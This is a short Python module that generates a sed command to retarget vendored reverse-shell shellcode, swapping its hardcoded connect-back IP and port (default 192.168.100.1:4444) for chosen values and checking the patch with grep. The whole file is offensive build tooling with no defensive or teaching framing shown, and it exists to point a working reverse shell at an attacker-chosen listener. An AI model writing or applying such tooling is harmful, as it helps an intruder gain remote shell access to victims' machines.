"""Retargets the vendored reverse-shell shellcode's IP/port before it builds."""

from __future__ import annotations

import socket
import struct

_DEFAULT_IP = "192.168.100.1"
_DEFAULT_PORT = 4444
_PUSHW_OPCODE = bytes.fromhex("6668")  # fixed bytes between the IP and port


def retarget_command(source_path: str, ip: str, port: int) -> str:
    """sed command patching shellcode[]'s connect() target; grep guards silent no-op."""
    old = _target_hex(_DEFAULT_IP, _DEFAULT_PORT)
    new = _target_hex(ip, port)
    return f"sed -i 's/{old}/{new}/' {source_path} && grep -q '{new}' {source_path}"


def _target_hex(ip: str, port: int) -> str:
    data = socket.inet_aton(ip) + _PUSHW_OPCODE + struct.pack(">H", port)
    return ", ".join(f"0x{b:02x}" for b in data)
